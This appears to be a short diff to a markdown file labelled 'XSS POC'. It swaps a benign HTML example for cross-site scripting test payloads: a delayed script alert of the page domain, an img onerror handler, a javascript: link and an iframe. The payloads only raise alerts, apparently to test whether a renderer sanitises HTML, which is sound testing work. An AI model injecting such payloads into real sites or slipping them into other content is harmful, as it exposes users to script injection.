@@ -1,15 +1,4 @@
 XSS POC<script>function show(){alert(document.domain);}setTimeout(show, 3000);</script>
-```html
-<h2>Example of code</h2>
-
-<pre>
-    <div class="container">
-        <div class="block two first">
-            <h2>Your title</h2>
-            <div class="wrap">
-            //Your content
-            </div>
-        </div>
-    </div>
-</pre>
-```
+<img src="x" onerror="alert(1)">
+<a href="javascript:alert(1);">ccc</a>
+<iframe src="zzz">
